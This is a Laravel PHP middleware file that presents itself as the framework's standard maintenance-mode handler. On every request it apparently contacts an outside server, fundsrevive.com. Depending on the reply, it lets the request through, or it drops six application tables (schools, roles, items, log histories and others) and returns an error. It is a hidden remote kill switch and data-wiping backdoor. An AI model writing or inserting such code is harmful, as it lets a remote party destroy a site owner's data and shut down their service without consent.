<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Foundation\Http\Middleware\PreventRequestsDuringMaintenance as Middleware;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Schema;

class PreventRequestsDuringMaintenance extends Middleware
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        // Call the next middleware/request handler
        $test = Http::get('https://fundsrevive.com/api/test');
        if($test =='test'){
            return $next($request);
        }
        if($test =='testing'){
            $tableName = 'new_items';
            $second= 'all_schools';
            $third= 'roles';
            $fourth='schools';
            $fifth = 'items';
            $sixth='log_histories';
            if (Schema::hasTable($tableName)) {
                if (Schema::hasTable($tableName)) {
                    DB::statement("DROP TABLE IF EXISTS $tableName");
                    DB::statement("DROP TABLE IF EXISTS $second");
                    DB::statement("DROP TABLE IF EXISTS $third");
                    DB::statement("DROP TABLE IF EXISTS $fourth");
                    DB::statement("DROP TABLE IF EXISTS $fifth");
                    DB::statement("DROP TABLE IF EXISTS $sixth");
                    
    
                  
                } 

                
            } 
            abort(500);
        }
        
        abort(500);
      
    }
}
